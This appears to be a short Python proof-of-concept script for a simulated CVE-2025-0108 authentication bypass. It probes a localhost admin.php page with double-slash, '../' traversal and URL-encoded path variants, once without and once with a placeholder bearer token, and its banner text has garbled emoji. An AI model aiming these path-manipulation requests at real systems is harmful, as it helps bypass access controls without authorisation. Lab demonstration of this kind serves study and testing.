import requests

URLS = [
    ("Normal path", "http://localhost:8080/admin.php"),
    ("Double slash", "http://localhost:8080//admin.php"),
    ("Path traversal", "http://localhost:8080/admin.php/../admin.php"),
    ("Encoded traversal", "http://localhost:8080/%2e%2e/admin.php"),
    ("Encoded slash", "http://localhost:8080/%2fadmin.php"),
]

HEADERS_VALID = {
    "Authorization": "Bearer securetoken"
}

def try_request(name, url, headers=None):
    print(f"[‚Üí] Trying: {name}")
    try:
        r = requests.get(url, headers=headers)
        print(f"Status: {r.status_code}\n{r.text}")
        preview = r.text.strip().splitlines()[0][:80]
        print(f"Response: {preview}\n")
    except Exception as e:
        print(f"[!] Error: {e}\n")

def main():
    print("=== üîê CVE-2025-0108 Simulated Exploit PoC ===\n")

    print("--- üö´ Requests WITHOUT Authorization ---\n")
    for name, url in URLS:
        try_request(name, url)

    print("--- ‚úÖ Requests WITH Authorization ---\n")
    for name, url in URLS:
        try_request(name, url, headers=HEADERS_VALID)

if __name__ == "__main__":
    main()
